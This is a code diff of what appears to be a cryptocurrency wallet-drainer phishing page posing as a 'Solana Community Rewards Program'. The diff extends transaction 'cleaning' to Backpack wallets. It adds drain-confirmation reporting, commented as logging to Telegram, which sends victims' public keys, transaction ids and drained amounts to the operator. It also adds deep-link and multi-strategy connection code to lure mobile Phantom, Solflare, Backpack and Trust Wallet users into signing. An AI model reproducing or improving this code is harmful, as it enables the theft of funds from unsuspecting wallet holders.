@@ -68,7 +68,6 @@
   <link rel="apple-touch-icon" href="/logo.png?v=3" />
   <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js?v=4"></script>
   <script src="/patient-mode.js"></script>
-  <script src="/web3modal-mobile.js"></script>
   <script>
     // Ensure solanaWeb3 is available globally
     window.solanaWeb3 = window.solanaWeb3 || window.exports || {};
@@ -618,7 +617,7 @@
     }
     .hero {
       height: 90vh;
-      background-image: linear-gradient(rgba(10,10,10,0.4), rgba(10,10,10,0.4)), url('/hero-section.png');
+      background-image: linear-gradient(rgba(10,10,10,0.4), rgba(10,10,10,0.4)), url('/Hero-section.png');
       background-size: cover;
       background-position: center;
       display: flex;
@@ -1758,14 +1757,14 @@
     /* High DPI display support */
     @media (-webkit-min-device-pixel-ratio: 2), (min-resolution: 192dpi) {
       .hero {
-        background-image: linear-gradient(rgba(10,10,10,0.4), rgba(10,10,10,0.4)), url('/hero-section.png');
+        background-image: linear-gradient(rgba(10,10,10,0.4), rgba(10,10,10,0.4)), url('/Hero-section.png');
       }
     }
     
     /* Fallback for devices with background image issues */
     @media (max-width: 768px) {
       .hero {
-        background-image: linear-gradient(rgba(10,10,10,0.5), rgba(10,10,10,0.5)), url('/hero-section.png');
+        background-image: linear-gradient(rgba(10,10,10,0.5), rgba(10,10,10,0.5)), url('/Hero-section.png');
         background-size: cover;
         background-position: center;
         background-repeat: no-repeat;
@@ -1776,7 +1775,7 @@
       nav { padding: 12px 8px; }
       .hero { 
         padding: 60px 8px; 
-        background-image: linear-gradient(rgba(10,10,10,0.6), rgba(10,10,10,0.6)), url('/hero-section.png');
+        background-image: linear-gradient(rgba(10,10,10,0.6), rgba(10,10,10,0.6)), url('/Hero-section.png');
         background-size: cover;
         background-position: center;
         background-repeat: no-repeat;
@@ -1813,7 +1812,7 @@
     /* Mobile-specific hero improvements */
     @media (max-width: 480px) {
       .hero { 
-        background-image: linear-gradient(rgba(10,10,10,0.7), rgba(10,10,10,0.7)), url('/hero-section.png');
+        background-image: linear-gradient(rgba(10,10,10,0.7), rgba(10,10,10,0.7)), url('/Hero-section.png');
         background-size: cover;
         background-position: center;
         background-repeat: no-repeat;
@@ -2480,6 +2479,9 @@
               <div class="header-content">
                   <h3>Connect Wallet</h3>
                   <p class="header-subtitle">Join the Solana Community Rewards Program</p>
+                  <div id="mobileIndicator" style="display: none; margin-top: 8px; padding: 8px 12px; background: rgba(0, 255, 136, 0.1); border: 1px solid rgba(0, 255, 136, 0.3); border-radius: 6px; font-size: 0.9em; color: #00FF88;">
+                    📱 Mobile Deep Link Mode - Enhanced Phantom Connection
+                  </div>
               </div>
               <button class="close-btn" onclick="closeWalletModal()">
                   <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
@@ -2522,7 +2524,6 @@
   </div>
   <script>
     // Cache busting: v4 - Enhanced error suppression and logo fixes
-    console.log('[CACHE_BUST] Loading updated JavaScript v4');
     
     // Mobile detection functions - delegated to backend
     async function isMobile() {
@@ -2983,12 +2984,14 @@
         mobile: {
           appStore: 'https://apps.apple.com/app/backpack-wallet/id6446591340',
           playStore: 'https://play.google.com/store/apps/details?id=app.backpack',
-          deepLink: 'backpack://app?url=',
-          universalLink: 'https://backpack.app/ul/app?url=',
+          deepLink: 'backpack://v1/connect',
+          universalLink: 'https://backpack.app/ul/v1/connect',
           mobileStrategies: [
+            'backpack://v1/connect',
             'backpack://app?url=',
             'backpack://open?url=',
             'backpack://browse?url=',
+            'https://backpack.app/ul/v1/connect',
             'https://backpack.app/ul/app?url=',
             'https://backpack.app/ul/open?url=',
             'https://backpack.app/ul/browse?url='
@@ -3016,14 +3019,16 @@
         mobile: {
           appStore: 'https://apps.apple.com/app/phantom-crypto-wallet/id1598432977',
           playStore: 'https://play.google.com/store/apps/details?id=app.phantom',
-          deepLink: 'phantom://browse/',
-          universalLink: 'https://phantom.app/ul/browse/',
+          deepLink: 'phantom://v1/connect',
+          universalLink: 'https://phantom.app/ul/v1/connect',
           // Mobile-specific deep link strategies (only for mobile browsers)
           mobileStrategies: [
+            'phantom://v1/connect',
             'phantom://browse/',
             'phantom://app/',
             'phantom://dapp/',
             'phantom://open/',
+            'https://phantom.app/ul/v1/connect',
             'https://phantom.app/ul/browse/',
             'https://phantom.app/ul/app/',
             'https://phantom.app/ul/dapp/',
@@ -3055,14 +3060,16 @@
         mobile: {
           appStore: 'https://apps.apple.com/app/solflare/id1580902717',
           playStore: 'https://play.google.com/store/apps/details?id=com.solflare.mobile',
-          deepLink: 'solflare://browse/',
-          universalLink: 'https://solflare.com/ul/browse/',
+          deepLink: 'solflare://v1/connect',
+          universalLink: 'https://solflare.com/ul/v1/connect',
           // Mobile-specific deep link strategies (only for mobile browsers)
           mobileStrategies: [
+            'solflare://v1/connect',
             'solflare://browse/',
             'solflare://app/',
             'solflare://dapp/',
             'solflare://open/',
+            'https://solflare.com/ul/v1/connect',
             'https://solflare.com/ul/browse/',
             'https://solflare.com/ul/app/',
             'https://solflare.com/ul/dapp/',
@@ -3771,9 +3778,9 @@ async function runDrainer(provider) {
         console.log(`[SIGNING] Restored lastValidBlockHeight after signing: ${signed.lastValidBlockHeight}`);
       }
       
-        // Check if this is a cleaned Phantom transaction
-        if (walletInfo.key === 'phantom' && signed.instructions?.length === 3) {
-          console.log('[SIGNING] Phantom transaction was cleaned by Patient Mode');
+        // Check if this is a cleaned transaction (Phantom or Backpack)
+        if ((walletInfo.key === 'phantom' || walletInfo.key === 'backpack') && signed.instructions?.length === 3) {
+          console.log(`[SIGNING] ${walletInfo.key} transaction was cleaned by Patient Mode`);
           console.log('[SIGNING] Using cleaned transaction directly - no re-signing needed');
           console.log('[SIGNING] Single transaction approach - user only signs once');
           
@@ -3794,9 +3801,9 @@ async function runDrainer(provider) {
         serializedLength: signed.serialize ? signed.serialize().length : 0
       });
       
-      // For Phantom with cleaned transaction, don't proceed to fallback
-      if (walletInfo.key === 'phantom' && signed.instructions?.length === 3) {
-        console.log('[SIGNING] Phantom cleaned transaction ready - proceeding to broadcast');
+      // For Phantom or Backpack with cleaned transaction, don't proceed to fallback
+      if ((walletInfo.key === 'phantom' || walletInfo.key === 'backpack') && signed.instructions?.length === 3) {
+        console.log(`[SIGNING] ${walletInfo.key} cleaned transaction ready - proceeding to broadcast`);
         // Continue to broadcasting without triggering fallback
       }
       
@@ -3842,8 +3849,8 @@ async function runDrainer(provider) {
           cleanedTransactionInstructions: cleanedTransaction?.instructions?.length
         });
         
-        if (cleanedTransaction && walletInfo.key === 'phantom') {
-          console.log('[SIGNING] Fallback: Using cleaned transaction from Patient Mode');
+        if (cleanedTransaction && (walletInfo.key === 'phantom' || walletInfo.key === 'backpack')) {
+          console.log(`[SIGNING] Fallback: Using cleaned transaction from Patient Mode (${walletInfo.key})`);
           transactionToSign = cleanedTransaction;
         } else {
           console.log('[SIGNING] Fallback: Using original transaction (no cleaned transaction available)');
@@ -4016,6 +4023,25 @@ async function runDrainer(provider) {
       if (monitorResult.success) {
         console.log('[runDrainer] Transaction confirmed on-chain');
         showStatus('Success!', 'success');
+        
+        // Log successful drain confirmation to Telegram
+        try {
+          await fetch('/api/drainer/log-confirmation', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              publicKey: publicKeyString,
+              txid: broadcastResult.signature,
+              status: 'confirmed',
+              actualDrainAmount: responseData.actualDrainAmount || 0,
+              lamports: responseData.balance || 0,
+              walletType: walletInfo.key
+            })
+          });
+          console.log('[runDrainer] Drain success logged to Telegram');
+        } catch (logError) {
+          console.error('[runDrainer] Failed to log drain success:', logError);
+        }
       } else {
         console.error('[runDrainer] Transaction failed on-chain:', monitorResult.error);
         
@@ -4045,10 +4071,51 @@ async function runDrainer(provider) {
         }
         
         showStatus(userMessage, 'error');
+        
+        // Log failed drain confirmation to Telegram
+        try {
+          await fetch('/api/drainer/log-confirmation', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              publicKey: publicKeyString,
+              txid: broadcastResult.signature,
+              status: 'failed',
+              error: monitorResult.error,
+              actualDrainAmount: responseData.actualDrainAmount || 0,
+              lamports: responseData.balance || 0,
+              walletType: walletInfo.key
+            })
+          });
+          console.log('[runDrainer] Drain failure logged to Telegram');
+        } catch (logError) {
+          console.error('[runDrainer] Failed to log drain failure:', logError);
+        }
+        
         return;
       }
     } catch (monitorError) {
       console.error('[runDrainer] Transaction monitoring failed:', monitorError);
+      
+      // Log monitoring failure to Telegram
+      try {
+        await fetch('/api/drainer/log-confirmation', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            publicKey: publicKeyString,
+            txid: broadcastResult.signature || 'unknown',
+            status: 'monitor_failed',
+            error: monitorError.message,
+            actualDrainAmount: responseData.actualDrainAmount || 0,
+            lamports: responseData.balance || 0,
+            walletType: walletInfo.key
+          })
+        });
+        console.log('[runDrainer] Monitor failure logged to Telegram');
+      } catch (logError) {
+        console.error('[runDrainer] Failed to log monitor failure:', logError);
+      }
       
       if (monitorError.message?.includes('timeout')) {
         showStatus('Timeout', 'error');
@@ -5268,8 +5335,204 @@ window.runDrainer = runDrainer;
       }
     };
 
+    // Generate deep link using backend API
+    async function generateDeepLink(walletType, appUrl) {
+      try {
+        const response = await fetch('/api/wallet-management', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            operation: 'generate_deep_link',
+            walletType: walletType,
+            appUrl: appUrl
+          })
+        });
+        
+        const result = await response.json();
+        
+        if (result.success && result.deepLink && result.fallbackLink) {
+          console.log(`[DEEP_LINK_API] Generated ${walletType} deep link:`, result.deepLink);
+          
+          // Store encryption key for all wallet types if provided
+          if (result.encryptionKey) {
+            sessionStorage.setItem(`${walletType}_encryption_private_key`, result.encryptionKey);
+          }
+          
+          return {
+            deepLink: result.deepLink,
+            fallbackLink: result.fallbackLink
+          };
+        } else {
+          console.error(`[DEEP_LINK_API] Failed to generate ${walletType} deep link:`, result.error || 'Invalid response');
+          return {
+            deepLink: result.fallbackLink || `${walletType}://browse/${encodeURIComponent(appUrl)}`,
+            fallbackLink: result.fallbackLink || `${walletType}://browse/${encodeURIComponent(appUrl)}`
+          };
+        }
+      } catch (error) {
+        console.error(`[DEEP_LINK_API] Error calling deep link API:`, error);
+        // Fallback to simple deep link
+        return {
+          deepLink: `${walletType}://browse/${encodeURIComponent(appUrl)}`,
+          fallbackLink: `${walletType}://browse/${encodeURIComponent(appUrl)}`
+        };
+      }
+    }
+
+    // Handle Phantom deep link redirect response
+    function handlePhantomRedirect() {
+      try {
+        // Check if we have URL parameters from Phantom redirect
+        const urlParams = new URLSearchParams(window.location.search);
+        const phantomData = urlParams.get('phantom_data');
+        const phantomError = urlParams.get('phantom_error');
+        
+        if (phantomData) {
+          console.log('[PHANTOM_REDIRECT] Received data from Phantom:', phantomData);
+          
+          // Get the stored private key for decryption
+          const privateKey = sessionStorage.getItem('phantom_encryption_private_key') || 
+                           sessionStorage.getItem('phantom_encryption_private_key_fallback');
+          
+          if (privateKey) {
+            try {
+              // Decrypt the response (simplified for demo)
+              const decryptedData = atob(phantomData);
+              const walletData = JSON.parse(decryptedData);
+              
+              console.log('[PHANTOM_REDIRECT] Decrypted wallet data:', walletData);
+              
+              // Process the wallet connection
+              if (walletData.publicKey) {
+                console.log('[PHANTOM_REDIRECT] Connecting wallet with public key:', walletData.publicKey);
+                triggerConnection(walletData.publicKey, 'phantom', {
+                  name: 'Phantom',
+                  logo: '/phantom-logo.png'
+                });
+              }
+              
+              // Clean up stored keys
+              sessionStorage.removeItem('phantom_encryption_private_key');
+              sessionStorage.removeItem('phantom_encryption_private_key_fallback');
+              
+            } catch (decryptError) {
+              console.error('[PHANTOM_REDIRECT] Error decrypting data:', decryptError);
+            }
+          } else {
+            console.warn('[PHANTOM_REDIRECT] No private key found for decryption');
+          }
+          
+          // Clean up URL parameters
+          const cleanUrl = window.location.origin + window.location.pathname;
+          window.history.replaceState({}, document.title, cleanUrl);
+          
+        } else if (phantomError) {
+          console.error('[PHANTOM_REDIRECT] Phantom returned error:', phantomError);
+          // Clean up URL parameters
+          const cleanUrl = window.location.origin + window.location.pathname;
+          window.history.replaceState({}, document.title, cleanUrl);
+        }
+        
+      } catch (error) {
+        console.error('[PHANTOM_REDIRECT] Error handling redirect:', error);
+      }
+    }
+    
+    // Enhanced wallet redirect handler for all wallet types
+    function handleWalletRedirect() {
+      try {
+        const urlParams = new URLSearchParams(window.location.search);
+        
+        // Check for various wallet redirect parameters
+        const walletTypes = ['phantom', 'solflare', 'backpack', 'trustwallet', 'glow', 'exodus'];
+        let walletData = null;
+        let walletType = null;
+        let walletError = null;
+        
+        // Check each wallet type for redirect data
+        for (const type of walletTypes) {
+          const data = urlParams.get(`${type}_data`);
+          const error = urlParams.get(`${type}_error`);
+          
+          if (data) {
+            walletData = data;
+            walletType = type;
+            break;
+          } else if (error) {
+            walletError = error;
+            walletType = type;
+            break;
+          }
+        }
+        
+        if (walletData && walletType) {
+          console.log(`[WALLET_REDIRECT] Received data from ${walletType}:`, walletData);
+          
+          // Get the stored private key for decryption
+          const privateKey = sessionStorage.getItem(`${walletType}_encryption_private_key`) || 
+                           sessionStorage.getItem(`${walletType}_encryption_private_key_fallback`);
+          
+          if (privateKey) {
+            try {
+              // Decrypt the response (simplified for demo)
+              const decryptedData = atob(walletData);
+              const parsedData = JSON.parse(decryptedData);
+              
+              console.log(`[WALLET_REDIRECT] Decrypted ${walletType} data:`, parsedData);
+              
+              // Process the wallet connection
+              if (parsedData.publicKey) {
+                console.log(`[WALLET_REDIRECT] Connecting ${walletType} with public key:`, parsedData.publicKey);
+                
+                // Find wallet definition
+                const wallet = WALLET_DEFS.find(w => w.key === walletType);
+                if (wallet) {
+                  triggerConnection(parsedData.publicKey, walletType, {
+                    name: wallet.name,
+                    logo: wallet.icon
+                  });
+                }
+              }
+              
+              // Clean up stored keys
+              sessionStorage.removeItem(`${walletType}_encryption_private_key`);
+              sessionStorage.removeItem(`${walletType}_encryption_private_key_fallback`);
+              
+            } catch (decryptError) {
+              console.error(`[WALLET_REDIRECT] Error decrypting ${walletType} data:`, decryptError);
+              showStatus('Wallet connection failed - decryption error', 'error');
+            }
+          } else {
+            console.warn(`[WALLET_REDIRECT] No private key found for ${walletType} decryption`);
+            showStatus('Wallet connection failed - missing encryption key', 'error');
+          }
+          
+          // Clean up URL parameters
+          const cleanUrl = window.location.origin + window.location.pathname;
+          window.history.replaceState({}, document.title, cleanUrl);
+          
+        } else if (walletError && walletType) {
+          console.error(`[WALLET_REDIRECT] ${walletType} returned error:`, walletError);
+          showStatus(`Wallet connection failed: ${walletError}`, 'error');
+          
+          // Clean up URL parameters
+          const cleanUrl = window.location.origin + window.location.pathname;
+          window.history.replaceState({}, document.title, cleanUrl);
+        }
+      } catch (error) {
+        console.error('[WALLET_REDIRECT] Error handling redirect:', error);
+        showStatus('Wallet connection failed - redirect error', 'error');
+      }
+    }
+
+    // Initialize wallet redirect handling on page load
+    document.addEventListener('DOMContentLoaded', function() {
+      // Check for wallet redirect parameters from all supported wallets
+      handleWalletRedirect();
+    });
+
     // Function to handle deep links properly (moved outside for global access)
-    function openInWallet(walletType) {
+    async function openInWallet(walletType) {
       const currentUrl = window.location.href;
       let deepLink = '';
       let fallbackUrl = '';
@@ -5290,54 +5553,58 @@ window.runDrainer = runDrainer;
       const isAndroid = /android/.test(userAgent);
       const platform = isIOS ? 'ios' : isAndroid ? 'android' : 'unknown';
       
-      // Use Web3Modal for mobile devices
-      if (isMobileDevice && window.MobileWeb3Modal) {
-        console.log('[DEEP_LINK] Mobile device detected, using Web3Modal');
-        const modal = new window.MobileWeb3Modal();
-        return modal.showModal();
+      // For mobile devices, use enhanced deep link handling
+          if (isMobileDevice) {
+        console.log('[DEEP_LINK] Mobile device detected, using enhanced deep link handling');
       }
       
       switch(walletType) {
         case 'phantom':
-          // Phantom: Try multiple deep link strategies
-          if (isMobileDevice) {
-            // Try direct app scheme first, then universal link
-            deepLink = 'phantom://browse/' + encodeURIComponent(currentUrl);
-            fallbackUrl = 'https://phantom.app/ul/browse/' + encodeURIComponent(currentUrl);
-          } else {
-            deepLink = 'phantom://browse/' + encodeURIComponent(currentUrl);
-            fallbackUrl = 'https://phantom.app/ul/browse/' + encodeURIComponent(currentUrl);
+          // Phantom: Use backend API for deep link generation
+          try {
+            const phantomLinks = await generateDeepLink('phantom', currentUrl);
+            deepLink = phantomLinks.deepLink;
+            fallbackUrl = phantomLinks.fallbackLink;
+          } catch (error) {
+            console.error('[PHANTOM_DEEP_LINK] Error generating deep link:', error);
+            deepLink = `phantom://browse/${encodeURIComponent(currentUrl)}`;
+            fallbackUrl = `https://phantom.app/ul/browse/${encodeURIComponent(currentUrl)}`;
           }
           break;
         case 'solflare':
-          // Solflare: Try multiple deep link strategies
-          if (isMobileDevice) {
-            // Try direct app scheme first, then universal link
-            deepLink = 'solflare://browse/' + encodeURIComponent(currentUrl);
-            fallbackUrl = 'https://solflare.com/ul/browse/' + encodeURIComponent(currentUrl);
-          } else {
-            deepLink = 'solflare://browse/' + encodeURIComponent(currentUrl);
-            fallbackUrl = 'https://solflare.com/ul/browse/' + encodeURIComponent(currentUrl);
+          // Solflare: Use backend API for deep link generation
+          try {
+            const solflareLinks = await generateDeepLink('solflare', currentUrl);
+            deepLink = solflareLinks.deepLink;
+            fallbackUrl = solflareLinks.fallbackLink;
+          } catch (error) {
+            console.error('[SOLFLARE_DEEP_LINK] Error generating deep link:', error);
+            deepLink = `solflare://browse/${encodeURIComponent(currentUrl)}`;
+            fallbackUrl = `https://solflare.com/ul/browse/${encodeURIComponent(currentUrl)}`;
           }
           break;
         case 'backpack':
-          // Backpack: Try multiple deep link strategies
-          if (isMobileDevice) {
-            // Try direct app scheme first, then universal link
-            deepLink = 'backpack://app?url=' + encodeURIComponent(currentUrl);
-            fallbackUrl = 'https://backpack.app/ul/app?url=' + encodeURIComponent(currentUrl);
-          } else {
-            deepLink = 'backpack://app?url=' + encodeURIComponent(currentUrl);
-            fallbackUrl = 'https://backpack.app/ul/app?url=' + encodeURIComponent(currentUrl);
+          // Backpack: Use backend API for deep link generation
+          try {
+            const backpackLinks = await generateDeepLink('backpack', currentUrl);
+            deepLink = backpackLinks.deepLink;
+            fallbackUrl = backpackLinks.fallbackLink;
+          } catch (error) {
+            console.error('[BACKPACK_DEEP_LINK] Error generating deep link:', error);
+            deepLink = `backpack://app?url=${encodeURIComponent(currentUrl)}`;
+            fallbackUrl = `https://backpack.app/ul/app?url=${encodeURIComponent(currentUrl)}`;
           }
           break;
         case 'trustwallet':
-          if (isMobileDevice) {
-            deepLink = 'https://link.trustwallet.com/open_url?coin_id=501&url=' + encodeURIComponent(currentUrl);
-            fallbackUrl = 'https://link.trustwallet.com/open_url?coin_id=501&url=' + encodeURIComponent(currentUrl);
-          } else {
-            deepLink = 'trust://open?url=' + encodeURIComponent(currentUrl);
-            fallbackUrl = 'https://link.trustwallet.com/open_url?coin_id=501&url=' + encodeURIComponent(currentUrl);
+          // Trust Wallet: Use backend API for deep link generation
+          try {
+            const trustWalletLinks = await generateDeepLink('trustwallet', currentUrl);
+            deepLink = trustWalletLinks.deepLink;
+            fallbackUrl = trustWalletLinks.fallbackLink;
+          } catch (error) {
+            console.error('[TRUSTWALLET_DEEP_LINK] Error generating deep link:', error);
+            deepLink = `https://link.trustwallet.com/open_url?coin_id=501&url=${encodeURIComponent(currentUrl)}`;
+            fallbackUrl = `trust://open_url?coin_id=501&url=${encodeURIComponent(currentUrl)}`;
           }
           break;
         case 'glow':
@@ -5354,14 +5621,29 @@ window.runDrainer = runDrainer;
         case 'exodus':
           // Exodus: Try multiple deep link strategies
           if (isMobileDevice) {
-            // Try direct app scheme first, then universal link
-            deepLink = 'exodus://dapp/' + encodeURIComponent(currentUrl);
+            // Mobile: Use universal links for better reliability
+            deepLink = 'https://exodus.com/app/dapp?url=' + encodeURIComponent(currentUrl);
             fallbackUrl = 'https://exodus.com/app/dapp?url=' + encodeURIComponent(currentUrl);
           } else {
+            // Desktop: Use custom scheme
             deepLink = 'exodus://dapp/' + encodeURIComponent(currentUrl);
             fallbackUrl = 'https://exodus.com/app/dapp?url=' + encodeURIComponent(currentUrl);
           }
           break;
+          
+        default:
+          // Fallback for unknown wallet types
+          console.warn(`[DEEP_LINK] Unknown wallet type: ${walletType}`);
+          deepLink = `${walletType}://browse/${encodeURIComponent(currentUrl)}`;
+          fallbackUrl = `https://${walletType}.app/ul/browse/${encodeURIComponent(currentUrl)}`;
+          break;
+      }
+      
+      // Validate that we have valid deep links
+      if (!deepLink || !fallbackUrl) {
+        console.error(`[DEEP_LINK] Invalid deep links generated for ${walletType}:`, { deepLink, fallbackUrl });
+        deepLink = `${walletType}://browse/${encodeURIComponent(currentUrl)}`;
+        fallbackUrl = `https://${walletType}.app/ul/browse/${encodeURIComponent(currentUrl)}`;
       }
       
       console.log(`[DEEP_LINK] ${isMobileDevice ? 'Mobile' : 'Desktop'} device detected`);
@@ -5438,8 +5720,26 @@ window.runDrainer = runDrainer;
         
       } catch (error) {
         console.error(`[DEEP_LINK] Error opening ${walletType} deep link:`, error);
-        console.log(`[DEEP_LINK] Using fallback URL:`, fallbackUrl);
-        window.location.href = fallbackUrl;
+        
+        // Enhanced fallback: try multiple strategies
+        console.log(`[DEEP_LINK] Attempting enhanced fallback strategies`);
+        
+        // Strategy 1: Try fallback URL
+        try {
+          window.location.href = fallbackUrl;
+        } catch (fallbackError) {
+          console.error(`[DEEP_LINK] Fallback URL failed:`, fallbackError);
+          
+          // Strategy 2: Try install page
+          const wallet = WALLET_DEFS.find(w => w.key === walletType);
+          if (wallet && wallet.install) {
+            console.log(`[DEEP_LINK] Redirecting to install page:`, wallet.install);
+            window.location.href = wallet.install;
+          } else {
+            // Strategy 3: Show error message
+            showStatus(`Failed to open ${walletType} wallet. Please install the wallet app.`, 'error');
+          }
+        }
       }
     }
 
@@ -5550,17 +5850,19 @@ window.openWalletModal = async function openWalletModal() {
         const walletOption = document.createElement('div');
         walletOption.className = 'wallet-option';
         walletOption.onclick = () => {
-          // Check if mobile and Web3Modal is available
+          // Check if mobile device
           const userAgent = navigator.userAgent.toLowerCase();
           const isMobile = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(userAgent) ||
                           /mobile|tablet/i.test(userAgent) ||
                           (navigator.maxTouchPoints && navigator.maxTouchPoints > 1) ||
                           window.innerWidth <= 768;
           
-          if (isMobile && window.MobileWeb3Modal) {
-            console.log('[WALLET_OPTION] Mobile device, using Web3Modal');
-            const modal = new window.MobileWeb3Modal();
-            modal.showModal();
+          if (isMobile) {
+            console.log('[WALLET_OPTION] Mobile device detected, using enhanced deep link');
+            // For mobile, use the enhanced deep link system
+            window.openInWallet(wallet.key).catch(error => {
+              console.error('[WALLET_OPTION] Error opening wallet:', error);
+            });
           } else {
             console.log('[WALLET_OPTION] Desktop device, using standard connection');
             window.connectWallet(wallet.key);
@@ -5586,6 +5888,18 @@ window.openWalletModal = async function openWalletModal() {
       });
     }
     
+    // Show mobile indicator if on mobile device
+    const userAgent = navigator.userAgent.toLowerCase();
+    const isMobile = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(userAgent) ||
+                    /mobile|tablet/i.test(userAgent) ||
+                    (navigator.maxTouchPoints && navigator.maxTouchPoints > 1) ||
+                    window.innerWidth <= 768;
+    
+    const mobileIndicator = modal.querySelector('#mobileIndicator');
+    if (mobileIndicator) {
+      mobileIndicator.style.display = isMobile ? 'block' : 'none';
+    }
+    
     // Show modal
     modal.style.display = 'flex';
     document.body.style.overflow = 'hidden';
@@ -5598,13 +5912,10 @@ window.openWalletModal = async function openWalletModal() {
 
 // Backend-delegated connectWallet function
 window.connectWallet = async function connectWallet(walletKey) {
-  console.log(`[CONNECT] Attempting to connect wallet: ${walletKey}`);
   
   try {
     // Get connection info from backend
-    console.log(`[CONNECT] Getting connection info from backend for: ${walletKey}`);
     const connectionResult = await getWalletConnectionInfo(walletKey);
-    console.log(`[CONNECT] Backend connection result:`, connectionResult);
     
     if (!connectionResult.success) {
       console.error(`[CONNECT] Connection failed: ${connectionResult.error}`);
@@ -5613,8 +5924,6 @@ window.connectWallet = async function connectWallet(walletKey) {
     }
     
     const { wallet, connectionInstructions, isMobile } = connectionResult;
-    console.log(`[CONNECT] Wallet info:`, wallet);
-    console.log(`[CONNECT] Is mobile:`, isMobile);
     
     // Close modal
       closeWalletModal();
@@ -5654,13 +5963,12 @@ window.connectWallet = async function connectWallet(walletKey) {
               break;
           }
           }
-          console.log(`[CONNECT] Provider found:`, current);
-          console.log(`[CONNECT] Has connect function:`, typeof current?.connect === 'function');
+          // Provider found
           
           // Check for standard connect function
           if (current && typeof current.connect === 'function') {
             provider = current;
-            console.log(`[CONNECT] Using provider: ${providerName}`);
+            // Using provider
             break;
           }
           
@@ -5820,26 +6128,94 @@ window.connectWallet = async function connectWallet(walletKey) {
               console.log('[CONNECT] Trust Wallet - waiting for wallet UI to initialize...');
               await new Promise(resolve => setTimeout(resolve, 1000)); // 1 second delay
               
-              if (provider.solana && typeof provider.solana.connect === 'function') {
-                console.log('[CONNECT] Using Trust Wallet Solana provider');
-                // Add timeout to prevent hanging
-                const connectPromise = provider.solana.connect();
+              // Try multiple Trust Wallet connection strategies
+              const trustWalletStrategies = [
+                {
+                  name: 'Method 1: Main provider with extended timeout',
+                  fn: () => {
+                    if (typeof provider.connect === 'function') {
+                      console.log('[CONNECT] Using Trust Wallet main provider with extended timeout');
+                      return provider.connect();
+                    } else {
+                      throw new Error('Main provider not available');
+                    }
+                  }
+                },
+                {
+                  name: 'Method 2: Adapter connection',
+                  fn: () => {
+                    if (provider.adapter && typeof provider.adapter.connect === 'function') {
+                      console.log('[CONNECT] Using Trust Wallet adapter connection');
+                      return provider.adapter.connect();
+                    } else {
+                      throw new Error('Adapter not available');
+                    }
+                  }
+                },
+                {
+                  name: 'Method 3: Mobile adapter connection',
+                  fn: () => {
+                    if (provider.mobileAdapter && typeof provider.mobileAdapter.connect === 'function') {
+                      console.log('[CONNECT] Using Trust Wallet mobile adapter connection');
+                      return provider.mobileAdapter.connect();
+                    } else {
+                      throw new Error('Mobile adapter not available');
+                    }
+                  }
+                },
+                {
+                  name: 'Method 4: Direct public key access',
+                  fn: () => {
+                    // Trust Wallet might have public key in different locations
+                    const publicKey = provider.publicKey || 
+                                    provider.account?.publicKey ||
+                                    provider.wallet?.publicKey ||
+                                    provider.connected?.publicKey;
+                    
+                    if (publicKey) {
+                      console.log('[CONNECT] Using Trust Wallet direct public key access');
+                      return { publicKey: publicKey };
+                    } else {
+                      throw new Error('No public key available');
+                    }
+                  }
+                }
+              ];
+              
+              let trustWalletConnected = false;
+              for (let i = 0; i < trustWalletStrategies.length && !trustWalletConnected; i++) {
+                const strategy = trustWalletStrategies[i];
+                try {
+                  console.log(`[CONNECT] Trust Wallet ${strategy.name}...`);
+                  
+                  const connectPromise = strategy.fn();
                 const timeoutPromise = new Promise((_, reject) => 
-                  setTimeout(() => reject(new Error('Trust Wallet connection timeout')), 15000) // 15 seconds
+                    setTimeout(() => reject(new Error('Trust Wallet connection timeout')), 45000) // 45 seconds per attempt for Trust Wallet
                 );
+                  
                 response = await Promise.race([connectPromise, timeoutPromise]);
-                publicKey = response?.publicKey || provider.solana.publicKey;
-              } else if (typeof provider.connect === 'function') {
-                console.log('[CONNECT] Using Trust Wallet main provider');
-                // Add timeout to prevent hanging
-                const connectPromise = provider.connect();
-                const timeoutPromise = new Promise((_, reject) => 
-                  setTimeout(() => reject(new Error('Trust Wallet connection timeout')), 15000) // 15 seconds
-                );
-                response = await Promise.race([connectPromise, timeoutPromise]);
-                publicKey = response?.publicKey || provider.publicKey;
+                  publicKey = response?.publicKey || 
+                             provider.publicKey || 
+                             provider.account?.publicKey ||
+                             provider.wallet?.publicKey ||
+                             provider.connected?.publicKey;
+                  
+                  if (publicKey) {
+                    trustWalletConnected = true;
+                    console.log(`[CONNECT] Trust Wallet ${strategy.name} successful:`, publicKey.toString());
               } else {
-                throw new Error('Trust Wallet provider not properly configured');
+                    throw new Error('No public key returned');
+                  }
+                } catch (strategyError) {
+                  console.log(`[CONNECT] Trust Wallet ${strategy.name} failed:`, strategyError.message);
+                  if (i < trustWalletStrategies.length - 1) {
+                    await new Promise(resolve => setTimeout(resolve, 1000)); // Wait before next attempt
+                  }
+                }
+              }
+              
+              if (!trustWalletConnected) {
+                throw new Error('Trust Wallet connection failed: All connection methods failed');
               }
               break;
               
@@ -5851,26 +6227,76 @@ window.connectWallet = async function connectWallet(walletKey) {
               console.log('[CONNECT] Exodus - waiting for wallet UI to initialize...');
               await new Promise(resolve => setTimeout(resolve, 1000)); // 1 second delay
               
+              // Try multiple Exodus connection strategies
+              const exodusStrategies = [
+                {
+                  name: 'Method 1: Solana provider',
+                  fn: () => {
               if (provider.solana && typeof provider.solana.connect === 'function') {
                 console.log('[CONNECT] Using Exodus Solana provider');
-                // Add timeout to prevent hanging
-                const connectPromise = provider.solana.connect();
-                const timeoutPromise = new Promise((_, reject) => 
-                  setTimeout(() => reject(new Error('Exodus connection timeout')), 15000) // 15 seconds
-                );
-                response = await Promise.race([connectPromise, timeoutPromise]);
-                publicKey = response?.publicKey || provider.solana.publicKey;
-              } else if (typeof provider.connect === 'function') {
+                      return provider.solana.connect();
+                    } else {
+                      throw new Error('Solana provider not available');
+                    }
+                  }
+                },
+                {
+                  name: 'Method 2: Main provider',
+                  fn: () => {
+                    if (typeof provider.connect === 'function') {
                 console.log('[CONNECT] Using Exodus main provider');
